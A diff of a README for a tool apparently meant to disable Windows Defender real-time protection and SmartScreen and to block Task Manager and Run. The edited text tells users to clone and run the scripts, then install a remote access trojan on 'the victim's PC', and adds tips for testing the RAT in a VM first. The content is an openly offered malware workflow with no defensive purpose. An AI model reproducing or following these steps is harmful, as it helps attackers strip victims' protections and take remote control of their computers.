@@ -11,7 +11,8 @@ The following Windows components are disabled:
 • Windows Defender Real-Time Protection  
 • Smart Screen (part of Windows Defender, will be deleted instead of disabled)  
 
-Simply run this script first, then install the RAT on the victim's PC, and voila!  
+How to use this script?  
+Download the scripts in this repo or git clone, then run the scripts, and install the RAT on the victim's PC, and voila!  
 Tip: If the RAT has problems (e.g., missing a module in Python) and you want to delete it, you can use File Explorer to find and delete the RAT.  
 Remember, you won't be able to use Task Manager or Run after running the script, so test the RAT first in a VM to make sure it works.  
 
